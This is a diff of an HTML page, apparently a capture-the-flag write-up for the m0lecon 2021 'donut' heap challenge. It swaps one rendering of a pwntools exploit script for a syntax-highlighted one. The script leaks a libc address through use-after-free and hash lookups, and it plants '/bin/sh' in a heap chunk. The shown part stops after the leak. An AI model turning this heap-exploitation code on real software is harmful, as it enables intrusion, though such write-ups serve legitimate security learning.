@@ -79,127 +79,112 @@
 <div>
     <img src="../imgs/m0lecon_21/donut_5.png" alt="">
 </div>
-<div>
-    <style 
-        type="text/css">
-            pre code {
-                      background-color: #008080;
-                      border: 1px solid #999;
-                      display: block;
-                      padding: 15px;
-                      color:  #F5F5DC;
-                    }
-    </style>
-    <pre>
-        <code>
-#!/usr/bin/env python
+<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #586e75; font-style: italic">#!/usr/bin/env python</span>
 
-from pwn import *
-elf = context.binary = ELF('./donut')
-libc = elf.libc
+<span style="color: #cb4b16">from</span> <span style="color: #268bd2">pwn</span> <span style="color: #cb4b16">import</span> <span style="color: #586e75">*</span>
+<span style="color: #839496">elf</span> <span style="color: #586e75">=</span> <span style="color: #839496">context</span><span style="color: #586e75">.</span><span style="color: #839496">binary</span> <span style="color: #586e75">=</span> <span style="color: #839496">ELF(</span><span style="color: #2aa198">'./donut'</span><span style="color: #839496">)</span>
+<span style="color: #839496">libc</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">libc</span>
 
-p = elf.process()
+<span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">process()</span>
 
-hash_array = [ "96700720", "59128949", "68494810", "63240277", "65389611", "81542419", "43581795", "23619862", "3658992",
- "76711907", "71665998", "15683261", "32348294", "71315162", "63191315", "71761334", "72960445", "35933716", "30013667", 
- "42612298", "2588139", "8223269", "67484351", "45101812", "84568362", "76174016", "39237169", "60852279", "24726743", 
- "757667", "10580529", "58424219", "3186797", "76815210", "54617883", "74816347", "50115642", "87900393", "71451045", 
- "80496260", "53857902", "96903552", "66124491", "10284671", "53865487", "31699703", "2495973", "28594113", "53671440",
-  "89001518", "49157316", "20783638", "30581988", "77956773", "15597200", "14264403", "38185848", "51657339", "96989785",
-   "76197161", "89535605", "37290320", "88116839", "22197362", "63951582", "33561185", "50591706", "91528316", 
-   "54122706", "37974918", "42246872", "19129057", "98369209", "52984707", "68224935", "13758028", "76330540", 
-   "99756262", "33883826", "31799979", "89457961", "16233294", "29393589", "8444933", "28652377", "50063909", "71087253",
-    "11166218", "61362678", "39804625", "50341762", "37032502", "44332690", "76855202", "88643958", "62328865", 
-    "6893836", "57586900", "30290972", "72956403", "36764532", "543287", "9715099", "75963011", "88349078", "69792684", 
-    "74110785", "26001031", "70666788", "27278827", "69904242", "92536969", "93805301", "84711856", "75284287", 
-    "73249460", "89025351", "62990711", "1961921", "23854045", "40923694", "65457500", "98338994", "50286893", 
-    "57986069", "63359604", "85367786", "84827962", "59781634", "28210847", "78100672", "207363", "45955055", "23423664", 
-    "31318524", "15772347", "20599539", "87024263", "16585338", "79492747", "23032730", "1642229", "38535571", 
-    "35734822", "75586280", "213107", "82649640", "6297437", "13427756", "37128572", "37473769", "80134574", "97613787",
-     "56617868", "39815734", "35035430", "12841160", "25989974", "13116645", "56346673", "81930753", "28448038", 
-     "45754025", "92106676", "49616649", "16496893", "52517764", "41256275", "42197321", "90730449", "710383", 
-     "79317370", "5420126", "38717882", "26901958", "71370854", "3835927", "82708891", "91397086", "71744457", 
-     "47607266", "39904943", "87311164", "85233363", "56809527", "60563604", "82099573", "83123319", "58646162", 
-     "23213128", "7698875", "38789795", "5585269", "96545538", "333769", "8222566", "23070646", "86875644", "37592538",
-      "38319787", "64898822", "55873103", "66703890", "49585935", "59575371", "68287875", "64089701", "7353420", 
-      "44220763", "9530516", "38236725", "31424907", "59065727", "86340438", "37560410", "31262738", "87495553", 
-      "32145721", "72538227", "88312635", "32378581", "29520672", "33279292", "58500097", "87635159", "80411534", 
-      "36209551", "44235947", "93782110", "49646362", "64721660", "20085388", "69093030", "30562537", "23588002", 
-      "29078112", "18308991", "22899410", "24466542", "92982386", "41545873", "10142091", "10211816", "59445110", 
-      "25163464", "51179559", "77970231", "36484723", "82176498", "46597385", "86771992", "75396333", "30709584", 
-      "66431220", "95385618", "35913005" ]
+<span style="color: #839496">hash_array</span> <span style="color: #586e75">=</span> <span style="color: #839496">[</span> <span style="color: #2aa198">"96700720"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"59128949"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"68494810"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"63240277"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"65389611"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"81542419"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"43581795"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"23619862"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"3658992"</span><span style="color: #839496">,</span>
+ <span style="color: #2aa198">"76711907"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"71665998"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"15683261"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"32348294"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"71315162"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"63191315"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"71761334"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"72960445"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"35933716"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"30013667"</span><span style="color: #839496">,</span> 
+ <span style="color: #2aa198">"42612298"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"2588139"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"8223269"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"67484351"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"45101812"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"84568362"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"76174016"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"39237169"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"60852279"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"24726743"</span><span style="color: #839496">,</span> 
+ <span style="color: #2aa198">"757667"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"10580529"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"58424219"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"3186797"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"76815210"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"54617883"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"74816347"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"50115642"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"87900393"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"71451045"</span><span style="color: #839496">,</span> 
+ <span style="color: #2aa198">"80496260"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"53857902"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"96903552"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"66124491"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"10284671"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"53865487"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"31699703"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"2495973"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"28594113"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"53671440"</span><span style="color: #839496">,</span>
+  <span style="color: #2aa198">"89001518"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"49157316"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"20783638"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"30581988"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"77956773"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"15597200"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"14264403"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"38185848"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"51657339"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"96989785"</span><span style="color: #839496">,</span>
+   <span style="color: #2aa198">"76197161"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"89535605"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"37290320"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"88116839"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"22197362"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"63951582"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"33561185"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"50591706"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"91528316"</span><span style="color: #839496">,</span> 
+   <span style="color: #2aa198">"54122706"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"37974918"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"42246872"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"19129057"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"98369209"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"52984707"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"68224935"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"13758028"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"76330540"</span><span style="color: #839496">,</span> 
+   <span style="color: #2aa198">"99756262"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"33883826"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"31799979"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"89457961"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"16233294"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"29393589"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"8444933"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"28652377"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"50063909"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"71087253"</span><span style="color: #839496">,</span>
+    <span style="color: #2aa198">"11166218"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"61362678"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"39804625"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"50341762"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"37032502"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"44332690"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"76855202"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"88643958"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"62328865"</span><span style="color: #839496">,</span> 
+    <span style="color: #2aa198">"6893836"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"57586900"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"30290972"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"72956403"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"36764532"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"543287"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"9715099"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"75963011"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"88349078"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"69792684"</span><span style="color: #839496">,</span> 
+    <span style="color: #2aa198">"74110785"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"26001031"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"70666788"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"27278827"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"69904242"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"92536969"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"93805301"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"84711856"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"75284287"</span><span style="color: #839496">,</span> 
+    <span style="color: #2aa198">"73249460"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"89025351"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"62990711"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"1961921"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"23854045"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"40923694"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"65457500"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"98338994"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"50286893"</span><span style="color: #839496">,</span> 
+    <span style="color: #2aa198">"57986069"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"63359604"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"85367786"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"84827962"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"59781634"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"28210847"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"78100672"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"207363"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"45955055"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"23423664"</span><span style="color: #839496">,</span> 
+    <span style="color: #2aa198">"31318524"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"15772347"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"20599539"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"87024263"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"16585338"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"79492747"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"23032730"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"1642229"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"38535571"</span><span style="color: #839496">,</span> 
+    <span style="color: #2aa198">"35734822"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"75586280"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"213107"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"82649640"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"6297437"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"13427756"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"37128572"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"37473769"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"80134574"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"97613787"</span><span style="color: #839496">,</span>
+     <span style="color: #2aa198">"56617868"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"39815734"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"35035430"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"12841160"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"25989974"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"13116645"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"56346673"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"81930753"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"28448038"</span><span style="color: #839496">,</span> 
+     <span style="color: #2aa198">"45754025"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"92106676"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"49616649"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"16496893"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"52517764"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"41256275"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"42197321"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"90730449"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"710383"</span><span style="color: #839496">,</span> 
+     <span style="color: #2aa198">"79317370"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"5420126"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"38717882"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"26901958"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"71370854"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"3835927"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"82708891"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"91397086"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"71744457"</span><span style="color: #839496">,</span> 
+     <span style="color: #2aa198">"47607266"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"39904943"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"87311164"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"85233363"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"56809527"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"60563604"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"82099573"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"83123319"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"58646162"</span><span style="color: #839496">,</span> 
+     <span style="color: #2aa198">"23213128"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"7698875"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"38789795"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"5585269"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"96545538"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"333769"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"8222566"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"23070646"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"86875644"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"37592538"</span><span style="color: #839496">,</span>
+      <span style="color: #2aa198">"38319787"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"64898822"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"55873103"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"66703890"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"49585935"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"59575371"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"68287875"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"64089701"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"7353420"</span><span style="color: #839496">,</span> 
+      <span style="color: #2aa198">"44220763"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"9530516"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"38236725"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"31424907"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"59065727"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"86340438"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"37560410"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"31262738"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"87495553"</span><span style="color: #839496">,</span> 
+      <span style="color: #2aa198">"32145721"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"72538227"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"88312635"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"32378581"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"29520672"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"33279292"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"58500097"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"87635159"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"80411534"</span><span style="color: #839496">,</span> 
+      <span style="color: #2aa198">"36209551"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"44235947"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"93782110"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"49646362"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"64721660"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"20085388"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"69093030"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"30562537"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"23588002"</span><span style="color: #839496">,</span> 
+      <span style="color: #2aa198">"29078112"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"18308991"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"22899410"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"24466542"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"92982386"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"41545873"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"10142091"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"10211816"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"59445110"</span><span style="color: #839496">,</span> 
+      <span style="color: #2aa198">"25163464"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"51179559"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"77970231"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"36484723"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"82176498"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"46597385"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"86771992"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"75396333"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"30709584"</span><span style="color: #839496">,</span> 
+      <span style="color: #2aa198">"66431220"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"95385618"</span><span style="color: #839496">,</span> <span style="color: #2aa198">"35913005"</span> <span style="color: #839496">]</span>
 
-#====================Healper_Functions=============================#
+<span style="color: #586e75; font-style: italic">#====================Healper_Functions=============================#</span>
 
-num = 1
-data = "0x"
+<span style="color: #839496">num</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">1</span>
+<span style="color: #839496">data</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">"0x"</span>
 
-def create(size,name):
-    global num
-    p.sendline('c')
-    p.sendline('100')
-    p.sendline('y')
-    p.sendline(str(size))
-    p.sendline(name)
-    p.readuntil('donut! ')
-    leak = int(p.recvline().strip(),16)
-    print(str(num) + ": " + str(hex(leak)))
-    num+=1
-    return leak
+<span style="color: #859900">def</span> <span style="color: #268bd2">create</span><span style="color: #839496">(size,name):</span>
+    <span style="color: #859900">global</span> <span style="color: #839496">num</span>
+    <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'c'</span><span style="color: #839496">)</span>
+    <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'100'</span><span style="color: #839496">)</span>
+    <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'y'</span><span style="color: #839496">)</span>
+    <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #268bd2">str</span><span style="color: #839496">(size))</span>
+    <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(name)</span>
+    <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">readuntil(</span><span style="color: #2aa198">'donut! '</span><span style="color: #839496">)</span>
+    <span style="color: #839496">leak</span> <span style="color: #586e75">=</span> <span style="color: #268bd2">int</span><span style="color: #839496">(p</span><span style="color: #586e75">.</span><span style="color: #839496">recvline()</span><span style="color: #586e75">.</span><span style="color: #839496">strip(),</span><span style="color: #2aa198">16</span><span style="color: #839496">)</span>
+    <span style="color: #268bd2">print</span><span style="color: #839496">(</span><span style="color: #268bd2">str</span><span style="color: #839496">(num)</span> <span style="color: #586e75">+</span> <span style="color: #2aa198">": "</span> <span style="color: #586e75">+</span> <span style="color: #268bd2">str</span><span style="color: #839496">(</span><span style="color: #268bd2">hex</span><span style="color: #839496">(leak)))</span>
+    <span style="color: #839496">num</span><span style="color: #586e75">+=</span><span style="color: #2aa198">1</span>
+    <span style="color: #859900">return</span> <span style="color: #839496">leak</span>
 
-def free(addr):
-    p.send('t')
-    p.sendline(str(hex(addr)))
+<span style="color: #859900">def</span> <span style="color: #268bd2">free</span><span style="color: #839496">(addr):</span>
+    <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">send(</span><span style="color: #2aa198">'t'</span><span style="color: #839496">)</span>
+    <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #268bd2">str</span><span style="color: #839496">(</span><span style="color: #268bd2">hex</span><span style="color: #839496">(addr)))</span>
 
-def view(addr):
-    global ans
-    p.send('v')
-    p.sendline(str(hex(addr)))
-    p.recvuntil('it!\n')
-    data = str(p.recvuntil('Welcome'))
+<span style="color: #859900">def</span> <span style="color: #268bd2">view</span><span style="color: #839496">(addr):</span>
+    <span style="color: #859900">global</span> <span style="color: #839496">ans</span>
+    <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">send(</span><span style="color: #2aa198">'v'</span><span style="color: #839496">)</span>
+    <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #268bd2">str</span><span style="color: #839496">(</span><span style="color: #268bd2">hex</span><span style="color: #839496">(addr)))</span>
+    <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">recvuntil(</span><span style="color: #2aa198">'it!\n'</span><span style="color: #839496">)</span>
+    <span style="color: #839496">data</span> <span style="color: #586e75">=</span> <span style="color: #268bd2">str</span><span style="color: #839496">(p</span><span style="color: #586e75">.</span><span style="color: #839496">recvuntil(</span><span style="color: #2aa198">'Welcome'</span><span style="color: #839496">))</span>
 
-    return (int(hashlib.sha256(data.encode('utf-8')).hexdigest(), 16) % 10**8)
+    <span style="color: #859900">return</span> <span style="color: #839496">(</span><span style="color: #268bd2">int</span><span style="color: #839496">(hashlib</span><span style="color: #586e75">.</span><span style="color: #839496">sha256(data</span><span style="color: #586e75">.</span><span style="color: #839496">encode(</span><span style="color: #2aa198">'utf-8'</span><span style="color: #839496">))</span><span style="color: #586e75">.</span><span style="color: #839496">hexdigest(),</span> <span style="color: #2aa198">16</span><span style="color: #839496">)</span> <span style="color: #586e75">%</span> <span style="color: #2aa198">10</span><span style="color: #586e75">**</span><span style="color: #2aa198">8</span><span style="color: #839496">)</span>
 
-#==========================Libc_Leak=============================#
+<span style="color: #586e75; font-style: italic">#==========================Libc_Leak=============================#</span>
 
-chunk_A = create(1100,b'A'*8)
-chunk_B = create(40,b'B'*7 + p64(0x91))
-chunk_C = create(40,b'C'*8)
-chunk_D = create(40,b'D'*8)
-chunk_E = create(40,'/bin/sh\0')
+<span style="color: #839496">chunk_A</span> <span style="color: #586e75">=</span> <span style="color: #839496">create(</span><span style="color: #2aa198">1100</span><span style="color: #839496">,</span><span style="color: #2aa198">b'A'</span><span style="color: #586e75">*</span><span style="color: #2aa198">8</span><span style="color: #839496">)</span>
+<span style="color: #839496">chunk_B</span> <span style="color: #586e75">=</span> <span style="color: #839496">create(</span><span style="color: #2aa198">40</span><span style="color: #839496">,</span><span style="color: #2aa198">b'B'</span><span style="color: #586e75">*</span><span style="color: #2aa198">7</span> <span style="color: #586e75">+</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x91</span><span style="color: #839496">))</span>
+<span style="color: #839496">chunk_C</span> <span style="color: #586e75">=</span> <span style="color: #839496">create(</span><span style="color: #2aa198">40</span><span style="color: #839496">,</span><span style="color: #2aa198">b'C'</span><span style="color: #586e75">*</span><span style="color: #2aa198">8</span><span style="color: #839496">)</span>
+<span style="color: #839496">chunk_D</span> <span style="color: #586e75">=</span> <span style="color: #839496">create(</span><span style="color: #2aa198">40</span><span style="color: #839496">,</span><span style="color: #2aa198">b'D'</span><span style="color: #586e75">*</span><span style="color: #2aa198">8</span><span style="color: #839496">)</span>
+<span style="color: #839496">chunk_E</span> <span style="color: #586e75">=</span> <span style="color: #839496">create(</span><span style="color: #2aa198">40</span><span style="color: #839496">,</span><span style="color: #2aa198">'/bin/sh\0'</span><span style="color: #839496">)</span>
 
-free(chunk_A)
+<span style="color: #839496">free(chunk_A)</span>
 
-for y in range(7):    
-    tmp = str(view(chunk_A+5-y))
-    i = -1
-    for x in hash_array:
-        i+=1
-        if x == tmp:
-            print(str(hex(i)) + ": " + str(x))
-            data += str(hex(i)[2:])
-            break
-p.clean()
-leak = int(data,16)
-libc.address = leak - 0x1ebbe0
+<span style="color: #859900">for</span> <span style="color: #839496">y</span> <span style="color: #859900">in</span> <span style="color: #268bd2">range</span><span style="color: #839496">(</span><span style="color: #2aa198">7</span><span style="color: #839496">):</span>    
+    <span style="color: #839496">tmp</span> <span style="color: #586e75">=</span> <span style="color: #268bd2">str</span><span style="color: #839496">(view(chunk_A</span><span style="color: #586e75">+</span><span style="color: #2aa198">5</span><span style="color: #586e75">-</span><span style="color: #839496">y))</span>
+    <span style="color: #839496">i</span> <span style="color: #586e75">=</span> <span style="color: #586e75">-</span><span style="color: #2aa198">1</span>
+    <span style="color: #859900">for</span> <span style="color: #839496">x</span> <span style="color: #859900">in</span> <span style="color: #839496">hash_array:</span>
+        <span style="color: #839496">i</span><span style="color: #586e75">+=</span><span style="color: #2aa198">1</span>
+        <span style="color: #859900">if</span> <span style="color: #839496">x</span> <span style="color: #586e75">==</span> <span style="color: #839496">tmp:</span>
+            <span style="color: #268bd2">print</span><span style="color: #839496">(</span><span style="color: #268bd2">str</span><span style="color: #839496">(</span><span style="color: #268bd2">hex</span><span style="color: #839496">(i))</span> <span style="color: #586e75">+</span> <span style="color: #2aa198">": "</span> <span style="color: #586e75">+</span> <span style="color: #268bd2">str</span><span style="color: #839496">(x))</span>
+            <span style="color: #839496">data</span> <span style="color: #586e75">+=</span> <span style="color: #268bd2">str</span><span style="color: #839496">(</span><span style="color: #268bd2">hex</span><span style="color: #839496">(i)[</span><span style="color: #2aa198">2</span><span style="color: #839496">:])</span>
+            <span style="color: #859900">break</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">clean()</span>
+<span style="color: #839496">leak</span> <span style="color: #586e75">=</span> <span style="color: #268bd2">int</span><span style="color: #839496">(data,</span><span style="color: #2aa198">16</span><span style="color: #839496">)</span>
